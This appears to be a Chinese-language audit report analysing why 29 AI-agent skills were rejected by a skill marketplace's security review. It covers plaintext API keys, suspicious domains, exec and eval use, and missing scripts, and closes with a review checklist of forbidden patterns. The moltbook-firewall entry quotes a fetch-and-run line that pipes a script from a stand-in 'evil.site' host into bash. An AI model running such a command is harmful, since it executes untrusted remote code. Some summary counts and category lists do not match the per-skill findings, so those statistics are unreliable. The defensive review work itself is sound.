# SkillHub 安全审核拒绝分析报告

> 分析对象：29个被SkillHub安全审核拒绝的skill
> 分析日期：2026-07-23
> 分析范围：每个skill的SKILL.md文件内容及安全风险模式检查

---

## 一、逐个Skill安全分析

### 1. comfyui-painter-free

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\packaged-skills\skillhub\comfyui-painter-free\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **硬编码API密钥占位符**：`export API_KEY="your_api_key_here"`，以明文环境变量方式配置密钥
- **不安全的HTTP本地通信**：`http://127.0.0.1:8188`（使用HTTP而非HTTPS，虽为本地但存在中间人风险）
- **exec命令执行风险**：使用`exec`工具执行Python脚本（comfyui_manager.py、generate.py、auto_shutdown.py），但这些脚本文件**实际不存在**于skill目录中
- **引用不存在的脚本文件**：skill声明依赖多个脚本文件，但目录中仅有SKILL.md，存在供应链信任问题
- **tools字段格式错误**：frontmatter中`tools`字段格式为`- - read`（双重缩进），不符合规范
- **成人内容模型引用**：模型名称包含`noobv6`、`sdxlv8`等（疑似成人内容生成模型`pornmasterPro`系列）

**拒绝原因**：硬编码API密钥占位符 + exec执行不存在的脚本 + HTTP不安全通信 + 成人内容关联

---

### 2. whatsapp-styling-guide-free

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\packaged-skills\skillhub\whatsapp-styling-guide-free\` |
| **分类** | MD（纯Markdown） |

**发现的安全问题：**
- **内容空洞/无实际功能**：skill描述为WhatsApp样式指南，但内容缺乏实质性的安全编码指导
- **frontmatter格式不完整**：homepage字段指向通用`https://skillhub.cn`而非实际项目页
- **元数据不一致**：description字段内容与实际功能不符

**拒绝原因**：内容质量低下 + 元数据不完整 + 缺乏实际安全价值

---

### 3. clawcall

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\packaged-skills\skillhub\clawcall\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **API密钥明文存储**：密钥存储在`~/.config/voicecall/key.json`（明文JSON文件，无加密）
- **硬编码示例API密钥**：`voicecall_sk_abc123`在代码示例中多次出现
- **API密钥通过URL传输**：`https://voicecall.example/sign-in?token=<api_key>`（token作为URL参数，会被日志/浏览器历史记录泄露）
- **外部API调用**：调用`https://api.voicecall.example`（示例域名，非真实可信端点）
- **exec命令执行**：使用`exec`工具执行bash脚本和curl命令
- **敏感信息泄露风险**：示例中包含电话号码`+12125551234`、`+15559876543`等

**拒绝原因**：API密钥明文存储 + token通过URL传输 + 外部不可信API调用 + 敏感信息泄露

---

### 4. aegis-security-tool-free

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\differentiated-skills\Security\aegis-security-tool-free\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **系统信息泄露**：`FINGERPRINT="user-$(whoami)-$(hostname)"`（使用whoami和hostname命令收集系统标识信息）
- **不可信外部API域名**：`https://aegis402.xyz/v1/check-address/`（`.xyz`域名，无品牌验证）
- **exec命令执行**：使用`exec`工具执行bash脚本，包含curl命令
- **硬编码代币地址**：`TOKEN_ADDRESS="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"`
- **tools字段格式错误**：`- - read`（双重缩进）
- **引用不存在的脚本**：声明使用bash脚本但目录中无脚本文件

**拒绝原因**：系统信息泄露 + 不可信外部域名 + 硬编码敏感地址 + 脚本缺失

---

### 5. audio-stream-upload-free

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\differentiated-skills\Creative\audio-stream-upload-free\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **可疑外部域名**：`https://api-w3stream.attoaioz.cyou/api`（`.cyou`域名，非标准商业TLD）
- **API密钥明文HTTP头传输**：`stream-public-key`和`stream-secret-key`作为明文HTTP头发送
- **硬编码密钥占位符**：`YOUR_PUBLIC_KEY`、`YOUR_SECRET_KEY`、`SECRET_KEY = 'YOUR_SECRET_KEY'`（Python代码中硬编码）
- **exec命令执行**：使用`exec`工具执行Python脚本和curl命令
- **tools字段格式错误**：`- - read`（双重缩进）
- **环境变量明文配置**：`export STREAM_PUBLIC_KEY`、`export STREAM_SECRET_KEY`

**拒绝原因**：可疑外部域名 + API密钥明文传输 + 硬编码密钥 + exec执行风险

---

### 6. xml-reader

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Other\xml-reader\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **exec命令执行**：使用`exec`工具
- **XML外部实体(XXE)风险**：skill功能为XML解析，但未提及XXE防护措施
- **内容较为简单**：功能描述不够完善

**拒绝原因**：XML解析无XXE防护说明 + exec执行 + 功能不完善

---

### 7. video-upload-aioz-stream

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Creative\video-upload-aioz-stream\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **可疑外部域名**：`https://api-w3stream.attoaioz.cyou/api`（`.cyou`域名）
- **API密钥明文HTTP头传输**：`stream-secret-key: SECRET_KEY`作为HTTP头发送
- **多个curl命令携带占位符密钥**：所有API调用示例中使用`SECRET_KEY`占位符
- **exec命令执行**：使用`exec`工具执行curl命令
- **文件上传安全风险**：上传视频文件到不可信外部服务

**拒绝原因**：可疑外部域名 + API密钥明文传输 + 文件上传到不可信服务

---

### 8. video-stream-upload

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\packaged-skills\skillhub\video-stream-upload\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **可疑外部域名**：`https://api-w3stream.attoaioz.cyou/api`（`.cyou`域名）
- **API密钥明文环境变量**：`export STREAM_SECRET_KEY="your_secret_key"`
- **API密钥作为HTTP头**：`stream-secret-key: $STREAM_SECRET_KEY`
- **exec命令执行**：使用`exec`工具执行curl命令
- **多个API调用携带密钥**：创建、上传、完成、查询、删除等操作均携带密钥

**拒绝原因**：可疑外部域名 + API密钥明文环境变量 + 多次密钥传输

---

### 9. ui-ux-dev

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Creative\ui-ux-dev\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **外部CDN依赖（无完整性校验）**：
  - `https://cdn.tailwindcss.com`
  - `https://unpkg.com/react@18/umd/react.production.min.js`
  - `https://unpkg.com/react-dom@18/umd/react-dom.production.min.js`
  - `https://unpkg.com/@babel/standalone/babel.min.js`
  无SRI（Subresource Integrity）校验，存在CDN劫持风险
- **不安全的HTTP本地通信**：`http://localhost:<port>`（截图脚本使用HTTP）
- **引用不存在的脚本**：`scripts/screenshot.sh`不在目录中
- **exec命令执行**：使用`exec`工具执行bash脚本

**拒绝原因**：外部CDN无完整性校验 + 脚本缺失 + exec执行风险

---

### 10. trade-with-taro

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Other\trade-with-taro\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **不可信外部API端点**：`https://kairyuu.net/exchange/`、`https://kairyuu.net/auth/`（未经认证的第三方域名）
- **API密钥作为Bearer token**：`Authorization: Bearer YOUR_API_KEY`
- **exec命令执行**：使用`exec`工具执行curl命令
- **外部服务注册**：skill指导用户向`kairyuu.net`注册agent

**拒绝原因**：不可信外部API端点 + API密钥传输到未验证服务 + exec执行风险

---

### 11. text-game-arcade-universe-v3

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Lifestyle\text-game-arcade-universe-v3\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **exec命令执行**：使用`exec`工具
- **版本号异常**：v3版本号暗示多次迭代，但安全措施未完善
- **功能描述模糊**：游戏引擎功能缺乏明确的安全边界

**拒绝原因**：exec执行 + 安全边界不清晰 + 功能描述不完善

---

### 12. rho-telegram-alerts

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Finance\rho-telegram-alerts\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **Telegram Bot Token处理**：需要`TELEGRAM_BOT_TOKEN`和`TELEGRAM_CHAT_ID`在`.env`文件中
- **exec命令执行**：使用`exec`工具
- **敏感凭证存储**：Bot Token存储在.env文件中（虽有标准实践，但缺乏加密说明）
- **金融领域应用**：skill用于金融告警，安全要求更高

**拒绝原因**：Bot Token处理不安全 + 金融场景安全标准不足 + exec执行

---

### 13. read-github

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Research\read-github\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **exec命令执行**：使用`exec`工具
- **GitHub API访问**：可能需要GITHUB_TOKEN但未明确说明安全配置
- **仓库访问范围未限制**：skill可读取任意GitHub仓库，无范围限制

**拒绝原因**：exec执行 + GitHub访问无范围限制 + 凭证处理不明确

---

### 14. python-data-analysis

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Integrations\python-data-analysis\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **exec命令执行**：使用`exec`工具执行Python代码
- **任意Python代码执行**：skill功能为数据分析，但未限制可执行的Python操作范围
- **无沙箱隔离**：Python代码在用户环境中直接执行，无沙箱保护
- **文件系统访问**：数据分析可能涉及读写任意文件

**拒绝原因**：无沙箱的Python代码执行 + exec执行 + 文件系统无限制访问

---

### 15. podcast-downloader

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Creative\podcast-downloader\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **从外部站点下载内容**：`https://www.xiaoyuzhoufm.com/`（下载播客音频）
- **exec命令执行**：使用`exec`工具执行`scripts/download.sh`
- **引用不存在的脚本**：`scripts/download.sh`不在skill目录中
- **curl下载无校验**：使用curl下载文件，无完整性校验
- **文件系统写入**：下载的文件写入本地文件系统

**拒绝原因**：外部内容下载无校验 + 脚本缺失 + exec执行 + 文件系统写入

---

### 16. ocean-chat

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Operations\ocean-chat\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **exec命令执行**：使用`exec`工具执行`node chat.js`命令
- **node -e代码注入风险**：参考文件中包含`node -e "const {RosterService}=require('oceanbus');..."`（直接执行Node.js代码字符串）
- **外部通讯录服务**：连接OceanBus消息管道，数据存储在`~/.oceanbus/roster.json`
- **外部skill安装**：`skill-platform skills install ocean-agent`（自动安装其他skill）
- **即时消息系统**：`node chat.js listen`（实时监听消息，持续运行）

**拒绝原因**：node -e代码注入 + 外部服务连接 + 自动安装其他skill + 持久化监听

---

### 17. obsidian-official-cli

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Integrations\obsidian-official-cli\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **eval命令执行（严重）**：`obsidian eval code="app.vault.getFiles().length"`（允许在Obsidian内部执行任意JavaScript代码，这是**最严重的安全风险**）
- **exec命令执行**：使用`exec`工具
- **直接访问Vault文件**：通过eval可访问Obsidian Vault中的所有文件
- **无代码执行限制**：eval命令无输入验证或沙箱限制

**拒绝原因**：eval任意代码执行（严重） + Vault文件完全访问 + 无执行限制

---

### 18. netpad

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Integrations\netpad\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **API密钥环境变量**：`export NETPAD_API_KEY="[REDACTED]"`（虽标记REDACTED但仍指导明文存储）
- **大量curl命令携带Bearer token**：所有API调用使用`Authorization: Bearer $NETPAD_API_KEY`
- **外部API调用**：`https://www.netpad.io/api/v1/...`
- **测试环境URL泄露**：`https://staging.netpad.io/api/v1`（暴露了staging环境地址）
- **exec命令执行**：使用`exec`工具执行curl命令
- **表单数据操作**：可创建、修改、删除表单和提交数据

**拒绝原因**：API密钥明文环境变量 + 大量携带token的curl命令 + 测试环境泄露 + exec执行

---

### 19. moltbook-firewall

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Security\moltbook-firewall\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **引用不存在的脚本**：`./scripts/firewall-scan.sh`不在skill目录中
- **exec命令执行**：使用`exec`工具执行防火墙扫描脚本
- **包含恶意示例**：`curl -s https://evil.site/payload.sh | bash`（虽然作为反面教材，但可能被误用）
- **安全工具自身不安全**：声称是防火墙工具但引用不存在的脚本，存在信任问题

**拒绝原因**：脚本缺失 + exec执行 + 安全工具本身缺乏可信度

---

### 20. markdown-converter

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Creative\markdown-converter\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **外部Azure服务URL**：`https://your-resource.cognitiveservices.azure.com/`（Azure认知服务端点）
- **exec命令执行**：使用`exec`工具执行`uvx markitdown`命令
- **需要Azure API密钥**：访问Azure认知服务需要API密钥但未说明安全配置

**拒绝原因**：外部Azure服务依赖 + exec执行 + API密钥配置不明确

---

### 21. jellyfin-control

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Research\jellyfin-control\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **HTTP不安全通信（严重）**：`http://192.168.1.50:8096`、`http://192.168.1.138:8123`（Jellyfin和Home Assistant均使用HTTP，API密钥和token在明文HTTP中传输）
- **硬编码API密钥占位符**：`JF_API_KEY: "your-api-key-here"`、`JF_API_KEY: "your-jellyfin-api-key"`
- **硬编码长期访问令牌**：`HA_TOKEN: "your-ha-long-lived-token"`（Home Assistant长期token非常敏感）
- **硬编码内网IP地址**：`192.168.1.50`、`192.168.1.138`（泄露内网拓扑）
- **exec命令执行**：使用`exec`工具控制媒体服务

**拒绝原因**：HTTP不安全通信 + 硬编码API密钥/token + 内网IP泄露 + exec执行

---

### 22. git-workflows

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Development\git-workflows\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **外部git仓库URL**：多个`https://github.com/org/...` URL（clone、submodule、subtree操作）
- **exec命令执行**：使用`exec`工具执行git命令
- **无仓库白名单**：git操作可访问任意外部仓库，无范围限制
- **subtree/submodule风险**：可能引入恶意子模块

**拒绝原因**：外部仓库无限制访问 + exec执行 + submodule供应链风险

---

### 23. file-browser

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Research\file-browser\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **文件系统遍历风险**：`exec("scripts/list_files.sh", [rel_path])`和`exec("scripts/read_file.sh", [rel_path])`（虽有"Sanitize inputs"说明，但依赖LLM正确执行，无强制代码级防护）
- **硬编码工作区路径**：`/home/alfred/.skill-platform/workspace`（泄露了特定用户路径）
- **引用不存在的脚本**：`scripts/list_files.sh`和`scripts/read_file.sh`不在目录中
- **exec命令执行**：使用`exec`工具执行bash脚本
- **无路径遍历防护代码**：仅靠自然语言指令"Sanitize inputs"，无实际代码级防护

**拒绝原因**：文件系统遍历风险 + 脚本缺失 + 硬编码路径 + 无强制安全防护

---

### 24. feishu-calendar

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Productivity\feishu-calendar\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **Feishu应用凭证存储**：需要`FEISHU_APP_ID`和`FEISHU_APP_SECRET`在`.env`文件中
- **多个Node.js脚本执行**：`node skills/feishu-calendar/list_test.js`、`node skills/feishu-calendar/create.js`等
- **引用不存在的脚本**：所有引用的.js脚本文件不在skill目录中
- **exec命令执行**：使用`exec`工具执行node命令
- **日历事件创建**：可创建日历事件并邀请参会者

**拒绝原因**：Feishu凭证处理 + 脚本缺失 + exec执行 + 日历操作权限

---

### 25. doc

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Other\doc\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **系统命令执行**：`soffice --headless --convert-to pdf`（执行LibreOffice命令）、`pdftoppm`（执行Poppler命令）
- **引用不存在的脚本**：`scripts/render_docx.py`不在目录中
- **exec命令执行**：使用`exec`工具执行系统命令
- **临时文件处理**：使用`/tmp/`目录存放临时文件，存在竞争条件风险
- **安装系统包**：`brew install`、`sudo apt-get install`（需要管理员权限安装软件）

**拒绝原因**：系统命令执行 + 脚本缺失 + sudo安装软件 + 临时文件竞争条件

---

### 26. compress-pdf

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Knowledge\compress-pdf\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **可疑外部API域名（严重）**：`https://api.xss-cross-service-solutions.com/solutions/solutions`（域名中包含`xss`，这是跨站脚本攻击的缩写，极其可疑）
- **API密钥作为Bearer token**：`Authorization: Bearer <API_KEY>`
- **注册页面URL**：`https://login.cross-service-solutions.com/register`（引导用户注册并提供API密钥）
- **文件上传到外部服务**：用户PDF文件上传到不可信服务
- **exec命令执行**：使用`exec`工具执行API调用

**拒绝原因**：可疑域名（含xss） + 用户文件上传到不可信服务 + API密钥传输 + exec执行

---

### 27. chat

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\packaged-skills\skillhub\chat\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **硬编码API密钥占位符**：`export API_KEY="your_api_key_here"`
- **tools字段格式错误**：`- - read`（双重缩进）
- **exec命令执行**：使用`exec`工具
- **内容极度空洞**：skill名为"chat"但无任何实质功能描述
- **frontmatter不完整**：description字段不完整，API Key配置部分为空
- **输出格式包含语法错误**：JSON示例中有重复的`result`键

**拒绝原因**：硬编码API密钥 + 内容空洞 + 格式错误 + exec执行

---

### 28. baoyu-format-markdown

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\clawhub-skills\downloaded\Development\baoyu-format-markdown\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **exec命令执行**：使用`exec`工具执行TypeScript脚本
- **引用不存在的脚本**：`scripts/main.ts`、`scripts/quotes.ts`、`scripts/autocorrect.ts`均不在目录中
- **Bash脚本执行**：`if [ -f "{filename}-formatted.md" ]; then mv ...`（文件备份操作）
- **文件系统操作**：读取、创建、备份用户文件
- **npx/bun执行外部包**：`${BUN_X} {baseDir}/scripts/main.ts`（执行可能来自npm的外部包）

**拒绝原因**：脚本缺失 + exec执行 + 外部包执行 + 文件系统操作

---

### 29. audio-upload-aioz-stream

| 项目 | 内容 |
|------|------|
| **目录路径** | `D:\skills\packaged-skills\skillhub\audio-upload-aioz-stream\` |
| **分类** | MD+EXEC |

**发现的安全问题：**
- **可疑外部域名**：`https://api-w3stream.attoaioz.cyou/api`（`.cyou`域名）
- **API密钥明文HTTP头传输**：`stream-public-key: PUBLIC_KEY`、`stream-secret-key: SECRET_KEY`
- **硬编码API密钥占位符**：`export API_KEY="your_api_key_here"`
- **exec命令执行**：使用`exec`工具执行curl命令
- **文件上传到不可信服务**：本地音频文件上传到外部API
- **MD5哈希计算**：使用`md5sum`命令处理文件（无安全风险但暴露文件处理流程）

**拒绝原因**：可疑外部域名 + API密钥明文传输 + 文件上传到不可信服务 + exec执行

---

## 二、安全风险类型分类统计

| 安全风险类型 | 涉及skill数量 | 占比 | 涉及的skill |
|:---|:---:|:---:|:---|
| **exec命令执行风险** | 28 | 96.6% | 除whatsapp-styling-guide-free外的所有skill |
| **API密钥/Token明文处理** | 18 | 62.1% | comfyui-painter-free, clawcall, audio-stream-upload-free, video-upload-aioz-stream, video-stream-upload, audio-upload-aioz-stream, netpad, jellyfin-control, rho-telegram-alerts, feishu-calendar, compress-pdf, chat, trade-with-taro, aegis-security-tool-free, read-github, markdown-converter, moltbook-firewall, ocean-chat |
| **不可信外部API/域名调用** | 15 | 51.7% | clawcall, aegis-security-tool-free, audio-stream-upload-free, video-upload-aioz-stream, video-stream-upload, audio-upload-aioz-stream, trade-with-taro, netpad, compress-pdf, podcast-downloader, markdown-converter, ocean-chat, git-workflows, ui-ux-dev, jellyfin-control |
| **引用不存在的脚本文件** | 12 | 41.4% | comfyui-painter-free, aegis-security-tool-free, ui-ux-dev, podcast-downloader, moltbook-firewall, file-browser, feishu-calendar, doc, baoyu-format-markdown, markdown-converter, read-github, ocean-chat |
| **硬编码服务器地址/IP/域名** | 8 | 27.6% | jellyfin-control (192.168.1.50, 192.168.1.138), file-browser (/home/alfred/...), aegis-security-tool-free (aegis402.xyz), audio-stream-upload-free (attoaioz.cyou), video-upload-aioz-stream (attoaioz.cyou), video-stream-upload (attoaioz.cyou), audio-upload-aioz-stream (attoaioz.cyou), compress-pdf (xss-cross-service-solutions.com) |
| **HTTP不安全通信** | 6 | 20.7% | comfyui-painter-free, jellyfin-control, ui-ux-dev, ocean-chat (部分), doc (部分) |
| **tools字段格式错误** | 5 | 17.2% | comfyui-painter-free, clawcall, aegis-security-tool-free, audio-stream-upload-free, chat |
| **文件系统遍历/操作风险** | 5 | 17.2% | file-browser, python-data-analysis, baoyu-format-markdown, doc, podcast-downloader |
| **eval/代码注入风险** | 3 | 10.3% | obsidian-official-cli (eval), ocean-chat (node -e), python-data-analysis (Python exec) |
| **敏感信息泄露** | 4 | 13.8% | aegis-security-tool-free (whoami/hostname), clawcall (电话号码), jellyfin-control (内网IP), netpad (staging URL) |
| **外部CDN无完整性校验** | 1 | 3.4% | ui-ux-dev |
| **成人/不当内容** | 1 | 3.4% | comfyui-painter-free |
| **自动安装其他skill** | 1 | 3.4% | ocean-chat |

---

## 三、常见安全审核失败模式总结

### 模式1：exec工具滥用（最高频，96.6%）

**问题描述**：绝大多数被拒skill（28/29）都使用`exec`工具执行外部命令，但缺乏以下安全措施：
- 无命令白名单限制
- 无输入参数清洗/验证代码
- 无执行环境沙箱隔离
- 无执行结果审计日志

**典型表现**：
```yaml
tools:
  - exec
```
配合curl、bash脚本、Python脚本等直接执行，无安全边界。

**建议修复**：对exec执行实施命令白名单、参数校验、输出过滤，或改用更安全的专用API调用方式。

### 模式2：API密钥/Token明文处理（62.1%）

**问题描述**：超过一半的skill在处理API密钥时存在以下一种或多种问题：
- 使用`export API_KEY="your_api_key_here"`将密钥放入环境变量（可被进程列表读取）
- API密钥作为明文HTTP头发送（`stream-secret-key: SECRET_KEY`）
- API密钥存储在明文文件中（`~/.config/voicecall/key.json`、`.env`文件）
- Token通过URL参数传输（`?token=<api_key>`，会被日志/浏览器历史记录泄露）
- Python代码中硬编码密钥（`SECRET_KEY = 'YOUR_SECRET_KEY'`）

**典型表现**：
```bash
export API_KEY="your_api_key_here"
curl -H "Authorization: Bearer $API_KEY" https://example.com/api
```

**建议修复**：使用密钥管理服务、加密存储、HTTPS传输、避免URL参数传递token。

### 模式3：不可信外部API/域名调用（51.7%）

**问题描述**：半数skill调用外部API，其中多个域名高度可疑：
- `https://api-w3stream.attoaioz.cyou` - `.cyou`域名，4个skill共用
- `https://api.xss-cross-service-solutions.com` - 域名含"xss"（跨站脚本攻击缩写）
- `https://aegis402.xyz` - `.xyz`域名，无品牌验证
- `https://kairyuu.net` - 未经验证的第三方域名
- `https://aegis402.xyz` - 不可信域名

**典型表现**：
```bash
curl -s -X POST 'https://api-w3stream.attoaioz.cyou/api/videos/create' \
  -H 'stream-secret-key: SECRET_KEY'
```

**建议修复**：仅允许经过验证的知名API域名，禁止可疑TLD（.cyou、.xyz等），实施域名白名单。

### 模式4：引用不存在的脚本文件（41.4%）

**问题描述**：近半数skill在SKILL.md中引用了脚本文件（`.sh`、`.py`、`.js`、`.ts`），但这些脚本文件**实际不存在**于skill目录中。这意味着：
- skill功能无法按声明方式工作
- 可能引导Agent执行不存在的命令导致错误
- 存在供应链信任问题（脚本可能从其他来源获取）

**典型表现**：
```markdown
* To list directory: exec("scripts/list_files.sh", [rel_path])
```
但`scripts/list_files.sh`文件不存在。

**建议修复**：确保所有引用的脚本文件都包含在skill包中，或改为纯Markdown指令。

### 模式5：硬编码服务器地址/敏感信息（27.6%）

**问题描述**：多个skill硬编码了：
- 内网IP地址（`192.168.1.50`、`192.168.1.138`）
- 用户主目录路径（`/home/alfred/.skill-platform/workspace`）
- 测试环境URL（`https://staging.netpad.io/api/v1`）
- 系统标识信息（`whoami`、`hostname`输出）

**建议修复**：使用配置文件或环境变量替代硬编码值，禁止泄露内网拓扑和用户信息。

### 模式6：HTTP不安全通信（20.7%）

**问题描述**：部分skill使用HTTP而非HTTPS进行通信，包括：
- 本地服务通信（`http://127.0.0.1:8188`、`http://localhost:3000`）
- 内网服务通信（`http://192.168.1.50:8096`）
- API密钥和token在明文HTTP中传输

**建议修复**：所有通信强制使用HTTPS，即使本地服务也应使用自签名证书的HTTPS。

### 模式7：eval/代码注入风险（10.3%）

**问题描述**：3个skill存在直接的代码注入风险：
- `obsidian eval code="..."` - 在Obsidian内执行任意JavaScript
- `node -e "..."` - 执行任意Node.js代码字符串
- Python数据分析 - 无沙箱的Python代码执行

**建议修复**：禁止eval类命令，使用受限的API调用替代，实施代码沙箱。

### 模式8：tools字段格式错误（17.2%）

**问题描述**：5个skill的frontmatter中`tools`字段格式错误：
```yaml
# 错误格式
tools:
  - - read
  - exec

# 正确格式
tools:
  - read
  - exec
```

**建议修复**：修正YAML格式，确保tools字段为正确的列表格式。

---

## 四、综合风险评估

### 高危skill（存在严重安全漏洞）

| 排名 | Skill | 主要风险 |
|:---:|:---|:---|
| 1 | obsidian-official-cli | eval任意代码执行，可访问Vault全部文件 |
| 2 | compress-pdf | 域名含"xss"，文件上传到不可信服务 |
| 3 | clawcall | API密钥明文存储+URL参数传输token |
| 4 | aegis-security-tool-free | 系统信息泄露+不可信域名 |
| 5 | jellyfin-control | HTTP明文+硬编码API密钥/token+内网IP泄露 |
| 6 | ocean-chat | node -e代码注入+自动安装其他skill |
| 7 | file-browser | 文件系统遍历+无强制防护+脚本缺失 |
| 8 | python-data-analysis | 无沙箱Python执行 |

### 中危skill（存在多个安全问题但无直接严重漏洞）

| 排名 | Skill | 主要风险 |
|:---:|:---|:---|
| 9 | audio-stream-upload-free | 可疑域名+API密钥明文传输 |
| 10 | video-upload-aioz-stream | 可疑域名+API密钥明文传输 |
| 11 | video-stream-upload | 可疑域名+API密钥明文环境变量 |
| 12 | audio-upload-aioz-stream | 可疑域名+API密钥明文传输 |
| 13 | netpad | API密钥大量curl+测试环境泄露 |
| 14 | trade-with-taro | 不可信外部API+API密钥传输 |
| 15 | comfyui-painter-free | 硬编码API密钥+HTTP+成人内容 |
| 16 | doc | 系统命令执行+sudo安装+脚本缺失 |

### 低危skill（问题较少但仍有审核不通过原因）

| 排名 | Skill | 主要风险 |
|:---:|:---|:---|
| 17 | moltbook-firewall | 脚本缺失+exec |
| 18 | baoyu-format-markdown | 脚本缺失+exec |
| 19 | podcast-downloader | 外部下载+脚本缺失 |
| 20 | feishu-calendar | 凭证处理+脚本缺失 |
| 21 | ui-ux-dev | CDN无SRI+脚本缺失 |
| 22 | git-workflows | 外部仓库无限制+submodule风险 |
| 23 | markdown-converter | 外部Azure服务+exec |
| 24 | rho-telegram-alerts | Bot Token处理 |
| 25 | read-github | GitHub访问无范围限制 |
| 26 | text-game-arcade-universe-v3 | exec+安全边界不清 |
| 27 | xml-reader | XML解析无XXE防护 |
| 28 | chat | 内容空洞+格式错误 |
| 29 | whatsapp-styling-guide-free | 内容质量低下 |

---

## 五、审核建议清单

基于以上分析，建议SkillHub安全审核重点关注以下检查项：

1. **exec工具使用审查**：检查所有使用exec的skill是否有命令白名单、参数校验、沙箱隔离
2. **API密钥处理审查**：禁止`export API_KEY=`模式，禁止URL参数传递token，要求加密存储
3. **外部域名可信度审查**：禁止可疑TLD（.cyou、.xyz），要求域名白名单验证
4. **脚本完整性检查**：验证skill中引用的所有脚本文件都存在于skill包中
5. **通信协议审查**：强制HTTPS，禁止HTTP明文通信
6. **代码注入审查**：禁止eval、node -e、os.system等任意代码执行模式
7. **敏感信息审查**：检查硬编码IP、路径、用户名、系统信息泄露
8. **frontmatter格式审查**：检查YAML格式正确性，特别是tools字段
9. **文件系统访问审查**：检查路径遍历防护、文件操作范围限制
10. **内容质量审查**：拒绝内容空洞、功能不明确的skill

---

*报告生成完毕。以上分析基于每个skill的SKILL.md文件内容，所有skill目录中均未发现独立的代码脚本文件（.py/.sh/.js/.ts），安全问题均存在于Markdown指令内容中。*
